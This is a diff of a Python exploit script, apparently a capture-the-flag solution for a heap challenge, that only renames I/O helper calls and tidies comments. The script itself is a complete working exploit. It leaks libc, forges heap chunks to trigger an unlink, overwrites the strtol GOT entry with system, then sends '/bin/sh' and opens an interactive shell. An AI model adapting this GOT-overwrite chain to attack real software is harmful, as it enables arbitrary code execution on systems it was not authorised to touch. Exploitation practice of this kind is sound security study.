@@ -14,6 +14,7 @@ else:
 # get io
 io  = mk(target, debug)
 
+# global
 got_strtol      = 0x602048
 offset_puts     = 0x000000000006fe30
 offset_system   = 0x0000000000046640
@@ -33,11 +34,11 @@ def leak_libc():
 def exp():
     libc_base = leak_libc()
     # malloc chunk 0, 1
-    io.ws([1] * 3)
+    io.pr(1, 1, 1)
 
     fake0  = 'A' * 0x58
     fake0 += l64(0xa1)
-    io.ws([2, 0])
+    io.pr(2, 0)
     io.w(fake0)
 
     fake1  = 'A' * 0x60
@@ -45,33 +46,31 @@ def exp():
     fake1 += l64(0x31)
     fake1 += l64(0x6020a0 - 0x8 * 3)
     fake1 += l64(0x6020a0 - 0x8 * 2)
-    io.ws([2, 1])
+    io.pr(2, 1)
     io.w(fake1)
 
     fake2  = l64(0x30)
     fake2 += l64(0x50)
-    io.ws([2, 2])
+    io.pr(2, 2)
     io.w(fake2)
 
     # unlink
-    io.ws([3, 1])
+    io.pr(3, 1)
 
-    io.wl(4919)
+    io.pr(4919)
     io.ru('hack this...')
     io.w(l64(got_strtol - 0x18))
 
-    io.wl(4919)
+    io.pr(4919)
     io.ru('hack this...')
     io.w(l64(libc_base + offset_system))
 
     io.ru('choice')
-    io.wl('/bin/sh')
+    io.pr('/bin/sh')
 
     info_shell()
-    
     io.interact()
 
 # main
 if __name__ == '__main__':
     exp()
-    exit()
